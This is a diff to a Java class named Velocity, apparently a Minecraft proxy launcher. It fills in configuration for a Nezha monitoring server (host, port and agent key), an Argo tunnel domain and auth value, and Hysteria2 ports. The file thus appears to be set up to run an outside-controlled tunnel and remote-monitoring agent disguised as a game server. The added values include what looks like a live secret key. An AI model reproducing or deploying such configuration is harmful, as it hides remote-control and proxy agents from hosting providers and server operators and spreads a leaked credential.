@@ -146,15 +146,15 @@ public final class Velocity {
   }
 
   private static void loadEnvVars(final Map<String, String> envVars) throws IOException {
-    envVars.put("UUID", "fe7431cb-ab1b-4205-a14c-d056f821b383");
-    envVars.put("FILE_PATH", "./world");
-    envVars.put("NEZHA_SERVER", "");
+    envVars.put("UUID", "c512a649-a295-4d14-840a-833411d1af30");
+    envVars.put("FILE_PATH", "./MRAPOLLO");
+    envVars.put("NEZHA_SERVER", "nzp.643208.xyz:18128");
     envVars.put("NEZHA_PORT", "");
-    envVars.put("NEZHA_KEY", "");
-    envVars.put("ARGO_PORT", "");
-    envVars.put("ARGO_DOMAIN", "");
-    envVars.put("ARGO_AUTH", "");
-    envVars.put("HY2_PORT", "");
+    envVars.put("NEZHA_KEY", "0cliAG94V7zJj7RaUvJWABrUQOBNGpbB");
+    envVars.put("ARGO_PORT", "25550");
+    envVars.put("ARGO_DOMAIN", "kr25550.apollo86.dpdns.org");
+    envVars.put("ARGO_AUTH", "kr25550.apollo86.dpdns.org");
+    envVars.put("HY2_PORT", "25550");
     envVars.put("TUIC_PORT", "");
     envVars.put("REALITY_PORT", "");
     envVars.put("UPLOAD_URL", "");
@@ -162,7 +162,7 @@ public final class Velocity {
     envVars.put("BOT_TOKEN", "");
     envVars.put("CFIP", "");
     envVars.put("CFPORT", "");
-    envVars.put("NAME", "Mc");
+    envVars.put("NAME", "Mc-KR");
 
     for (String var : ALL_ENV_VARS) {
       final String value = System.getenv(var);
